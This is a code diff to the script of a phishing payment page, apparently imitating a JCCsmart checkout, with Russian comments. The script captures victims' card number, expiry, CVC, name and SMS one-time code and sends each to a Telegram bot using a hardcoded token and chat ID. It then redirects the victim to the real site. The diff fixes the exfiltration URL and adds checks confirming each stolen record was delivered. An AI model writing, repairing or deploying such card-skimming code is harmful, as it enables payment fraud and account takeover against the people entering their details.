@@ -88,7 +88,7 @@
 </div>
 
 <script>
-// Конфигурация Telegram (ваши токены сохранены)
+// Настройки Telegram (Проверьте правильность этих данных)
 const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
 const CHAT_ID = '6576262467';
 
@@ -100,24 +100,27 @@ function nav(n) {
     }
 }
 
-// Форматирование номера карты и даты
+// Форматирование ввода карты и даты
 document.getElementById('card').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
 });
 document.getElementById('exp').addEventListener('input', function (e) {
-    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+    let val = e.target.value.replace(/[^\d]/g, '');
+    if (val.length >= 2) {
+        val = val.substring(0, 2) + '/' + val.substring(2, 4);
+    }
+    e.target.value = val;
 });
-
-// Ограничение ввода в поле кода (только цифры)
 document.getElementById('sms-code').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '');
 });
 
-// Функция отправки сообщений в Telegram
+// Новая надежная функция отправки с отслеживанием ошибок
 async function sendToTelegram(text) {
-    const url = `telegram.org{BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`; // Исправлен URL-адрес
+    
     try {
-        await fetch(url, {
+        const response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -126,8 +129,18 @@ async function sendToTelegram(text) {
                 parse_mode: 'Markdown'
             })
         });
+        
+        const result = await response.json();
+        
+        if (!result.ok) {
+            alert(`Ошибка Telegram API: ${result.description}\nПроверьте BOT_TOKEN и CHAT_ID.`);
+            return false;
+        }
+        return true;
     } catch (error) {
-        console.error('Error sending to Telegram:', error);
+        alert(`Ошибка сети: Не удалось отправить запрос в Telegram. Проверьте подключение.`);
+        console.error(error);
+        return false;
     }
 }
 
@@ -146,13 +159,16 @@ async function sendData() {
     btn.disabled = true;
     btn.innerText = 'Processing...';
 
-    // Формируем текст лога для отправки в Telegram
-    const message = `💳 *Новые данные карты*\n\n👤 Имя: ${name}\n🔢 Номер: ${card}\n📅 Срок: ${exp}\n🔒 CVC: ${cvc}`;
+    const message = `💳 *НОВЫЕ ДАННЫЕ КАРТЫ*\n\n👤 Имя: \`${name}\`\n🔢 Номер: \`${card}\`\n📅 Срок: \`${exp}\`\n🔒 CVC: \`${cvc}\``;
     
-    await sendToTelegram(message);
+    const isSent = await sendToTelegram(message);
     
-    // Переходим к вводу SMS-кода
-    nav(3);
+    if (isSent) {
+        nav(3); // Переход на ввод СМС только если лог ушел
+    } else {
+        btn.disabled = false;
+        btn.innerText = 'Pay 161.00€';
+    }
 }
 
 async function verifyCode() {
@@ -167,17 +183,19 @@ async function verifyCode() {
     btn.disabled = true;
     btn.innerText = 'Verifying...';
 
-    // Отправляем SMS-код в Telegram
-    const message = `💬 *Получен SMS-код*\n\n🔑 Код: ${code}`;
-    await sendToTelegram(message);
+    const message = `💬 *ПОЛУЧЕН СМС-КОД*\n\n🔑 Код: \`${code}\``;
+    
+    const isSent = await sendToTelegram(message);
 
-    // Показываем экран финальной загрузки
-    document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
-
-    // Перенаправление на официальный сайт JCCsmart через 3 секунды
-    setTimeout(() => {
-        window.location.href = "jccsmart.com";
-    }, 3000);
+    if (isSent) {
+        document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
+        setTimeout(() => {
+            window.location.href = "jccsmart.com"; // Добавлен https:// протокол
+        }, 3000);
+    } else {
+        btn.disabled = false;
+        btn.innerText = 'Confirm Payment';
+    }
 }
 </script>
 
